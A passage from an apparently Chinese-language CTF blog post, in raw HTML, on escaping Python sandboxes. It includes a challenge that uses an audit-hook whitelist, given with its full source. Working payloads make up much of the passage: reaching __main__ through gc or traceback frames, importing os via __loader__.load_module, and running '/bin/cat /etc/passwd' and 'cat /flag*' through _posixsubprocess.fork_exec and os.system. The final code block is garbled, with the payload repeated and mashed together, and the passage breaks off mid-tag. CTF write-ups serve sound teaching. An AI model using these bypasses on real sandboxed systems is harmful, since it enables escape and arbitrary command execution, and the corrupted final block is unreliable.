sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;module <span class="string">&#x27;__main__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>, <span class="string">&#x27;my_input&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;__main__&#x27;</span>].aaa</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;bbb&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 __builtins__篡改内置函数等,这只是一个思路.</p>
<p>总体来说,只要获取了某个函数或者变量就可以篡改, 难点就在于获取.</p>
<h4 id="利用-gc-获取已删除模块">利用 gc 获取已删除模块</h4>
<p>这个思路来源于 writeup by fab1ano – github</p>
<p>这道题的目标是覆盖 <strong>main</strong> 中的 <strong>exit 函数,但是题目将 sys.modules['__main</strong>’] 删除了,无法直接获取.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> <span class="built_in">set</span>(sys.modules.keys()):</span><br><span class="line">    <span class="keyword">if</span> module <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">del</span> sys.modules[module]</span><br></pre></td></tr></table></figure>
<p>gc 是Python的内置模块，全名为”garbage collector”，中文译为”垃圾回收”。gc 模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互。</p>
<p>Python 使用了引用计数作为其主要的内存管理机制，同时也引入了循环垃圾回收器来检测并收集循环引用的对象。gc 模块提供了一些函数，让你可以直接控制这个循环垃圾回收器。</p>
<p>下面是一些 gc 模块中的主要函数：</p>
<ol>
<li>
<p>gc.collect(generation=2)：这个函数会立即触发一次垃圾回收。你可以通过 generation 参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</p>
</li>
<li>
<p>gc.get_objects()：这个函数会返回当前被管理的所有对象的列表。</p>
</li>
<li>
<p>gc.get_referrers(*objs)：这个函数会返回指向 objs 中任何一个对象的对象列表。</p>
</li>
</ol>
<p>exp 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> obj <span class="keyword">in</span> gc.get_objects():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__name__&#x27;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(obj):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> <span class="keyword">in</span> obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module __main__&#x27;</span>)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> == obj.__name__:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Found module os&#x27;</span>)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&quot;[+] bypass&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>在 3.11 版本和 python 3.8.10 版本中测试发现会触发 gc.get_objects hook 导致无法成功.</p>
<p>利用 traceback 获取模块</p>
<p>这个思路来源于 writeup by hstocks – github</p>
<p>主动抛出异常, 并获取其后要执行的代码, 然后将__exit__ 进行替换, 思路也是十分巧妙.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"><span class="comment"># Walk up stack frames until we find one which</span></span><br><span class="line"><span class="comment"># has a reference to the audit function</span></span><br><span class="line"><span class="keyword">while</span> nxt_frame:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;audit&#x27;</span> <span class="keyword">in</span> nxt_frame.f_globals:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line"><span class="comment"># Neuter the __exit function</span></span><br><span class="line">nxt_frame.f_globals[<span class="string">&#x27;__exit&#x27;</span>] = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Now we&#x27;re free to call whatever we want</span></span><br><span class="line">os.system(<span class="string">&#x27;cat /flag*&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>但是实际测试时使用 python 3.11 发现 nxt_frame = tb.tb_frame 会触发 object.<strong>getattr</strong> hook. 不同的版本中触发 hook 的地方会有差异,这个 payload 可能仅在 <code>python 3.9 (题目版本)</code>中适用</p>
<h4 id="绕过-audit-hook">绕过 audit hook</h4>
<p>Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动。</p>
<p>Python 中的审计事件包括但不限于以下几类：</p>
<ul>
<li>import：发生在导入模块时。</li>
<li>open：发生在打开文件时。</li>
<li>write：发生在写入文件时。</li>
<li>exec：发生在执行Python代码时。</li>
<li>compile：发生在编译Python代码时。</li>
<li></li>
<li>ocket：发生在创建或使用网络套接字时。</li>
<li>os.system，os.popen等：发生在执行操作系统命令时。</li>
<li>subprocess.Popen，subprocess.run等：发生在启动子进程时。</li>
<li>PEP 578 – Python Runtime Audit Hooks</li>
</ul>
<p>calc_jail_beginner_level6 这道题中使用了 audithook 构建沙箱,采用白名单来进行限制.audit hook 属于 python 底层的实现,因此常规的变换根本无法绕过.</p>
<p>题目源码如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_input</span>():</span><br><span class="line">    dict_global = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">      <span class="keyword">except</span> EOFError:</span><br><span class="line">          <span class="built_in">print</span>()</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">      <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">  WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_                _                           _       _ _   _                _   __</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | / /</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | &#x27;_ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  CODE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  dict_global = dict()</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">      except EOFError:</span></span><br><span class="line"><span class="string">          print()</span></span><br><span class="line"><span class="string">          break</span></span><br><span class="line"><span class="string">      except KeyboardInterrupt:</span></span><br><span class="line"><span class="string">          print(&#x27;bye~~&#x27;)</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      if input_data == &#x27;&#x27;:</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          complie_code = compile(input_data, &#x27;&lt;string&gt;&#x27;, &#x27;single&#x27;)</span></span><br><span class="line"><span class="string">      except SyntaxError as err:</span></span><br><span class="line"><span class="string">          print(err)</span></span><br><span class="line"><span class="string">          continue</span></span><br><span class="line"><span class="string">      try:</span></span><br><span class="line"><span class="string">          exec(complie_code, dict_global)</span></span><br><span class="line"><span class="string">      except Exception as err:</span></span><br><span class="line"><span class="string">          print(err)</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;White list of audit hook ===&gt; builtins.input,builtins.input/result,exec,compile&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Some code of python jail:&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(CODE)</span><br><span class="line">  my_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  sys.addaudithook(my_audit_hook)</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>
<p>这道题需要绕过的点有两个:</p>
<p>绕过 import 导入模块. 如果直接使用 import,就会触发 audithook</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"> Operation <span class="keyword">not</span> permitted: <span class="keyword">import</span></span><br><span class="line"></span><br><span class="line">绕过常规的命令执行方法执行命令. 利用 os, subproccess 等模块执行命令时也会触发 audithook</span><br></pre></td></tr></table></figure>
<p>调试技巧</p>
<p>本地调试时可以在 hook 函数中添加打印出 hook 的类型.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] <span class="subst">&#123;my_event&#125;</span>, <span class="subst">&#123;_&#125;</span>&#x27;</span>)</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br></pre></td></tr></table></figure>
<p>这样在测试 payload 时就可以知道触发了哪些 hook</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">[+] builtins.<span class="built_in">input</span>/result, (<span class="string">&#x27;import os&#x27;</span>,)</span><br><span class="line">[+] <span class="built_in">compile</span>, (<span class="string">b&#x27;import os&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>)</span><br><span class="line">[+] <span class="built_in">exec</span>, (&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x7f966795bec0</span>, file <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>&gt;,)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module 导入模块</span><br><span class="line"></span><br><span class="line">__loader__.load_module(fullname) 也是 python 中用于导入模块的一个方法并且不需要导入其他任何库.</span><br><span class="line"></span><br><span class="line"> __loader__.load_module(<span class="string">&#x27;os&#x27;</span>) </span><br><span class="line"></span><br><span class="line">__loader__ 实际上指向的是 _frozen_importlib.BuiltinImporter 类,也可以通过别的方式进行获取</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">84</span>].__name__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;BuiltinImporter&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module 也有一个缺点就是无法导入非内建模块. 例如 socket</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Traceback (most recent call last):</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">290</span>, <span class="keyword">in</span> _load_module_shim</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">721</span>, <span class="keyword">in</span> _load</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">676</span>, <span class="keyword">in</span> _load_unlocked</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">573</span>, <span class="keyword">in</span> module_from_spec</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">776</span>, <span class="keyword">in</span> create_module</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ImportError: <span class="string">&#x27;socket&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> a built-<span class="keyword">in</span> module</span><br></pre></td></tr></table></figure>
<h4 id="posixsubprocess-执行命令">_posixsubprocess 执行命令</h4>
<p>_posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 _posixsubprocess.</p>
<p>该模块的核心功能是 <code>fork_exec</code> 函数，<code>fork_exec</code> 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.</p>
<p>在我本地的 Python 3.11 中具体的函数声明如下:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fork_exec</span>(<span class="params"></span></span><br><span class="line"><span class="params">    __process_args: <span class="type">Sequence</span>[StrOrBytesPath] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __executable_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>],</span></span><br><span class="line"><span class="params">    __close_fds: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    __fds_to_keep: <span class="built_in">tuple</span>[<span class="built_in">int</span>, ...],</span></span><br><span class="line"><span class="params">    __cwd_obj: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    __env_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __p2cread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __p2cwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pred: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_read: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_write: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __restore_signals: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __call_setsid: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __pgid_to_set: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __gid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __groups_list: <span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __uid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __child_umask: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __preexec_fn: <span class="type">Callable</span>[[], <span class="literal">None</span>],</span></span><br><span class="line"><span class="params">    __allow_vfork: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">int</span>: ...</span><br><span class="line"></span><br><span class="line">__process_args: 传递给新进程的命令行参数，通常为程序路径及其参数的列表。</span><br><span class="line">__executable_list: 可执行程序路径的列表。</span><br><span class="line">__close_fds: 如果设置为<span class="literal">True</span>，则在新进程中关闭所有的文件描述符。</span><br><span class="line">__fds_to_keep: 一个元组，表示在新进程中需要保持打开的文件描述符的列表。</span><br><span class="line">__cwd_obj: 新进程的工作目录。</span><br><span class="line">__env_list: 环境变量列表，它是键和值的序列，例如：[“PATH=/usr/<span class="built_in">bin</span>”, “HOME=/home/user”]。</span><br><span class="line">__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite: 这些是文件描述符，用于在父子进程间进行通信。</span><br><span class="line">__errpipe_read, __errpipe_write: 这两个文件描述符用于父子进程间的错误通信。</span><br><span class="line">__restore_signals: 如果设置为<span class="number">1</span>，则在新创建的子进程中恢复默认的信号处理。</span><br><span class="line">__call_setsid: 如果设置为<span class="number">1</span>，则在新进程中创建新的会话。</span><br><span class="line">__pgid_to_set: 设置新进程的进程组 ID。</span><br><span class="line">__gid_object, __groups_list, __uid_object: 这些参数用于设置新进程的用户ID 和组 ID。</span><br><span class="line">__child_umask: 设置新进程的 umask。</span><br><span class="line">__preexec_fn: 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。</span><br><span class="line">__allow_vfork: 如果设置为<span class="literal">True</span>，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。</span><br></pre></td></tr></table></figure>
<p>下面是一个最小化示例:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)xxxxxxxxxx <span class="keyword">import</span> osimport _posixsubprocess_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="keyword">import</span> os <span class="keyword">import</span> _posixsubprocess _posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span 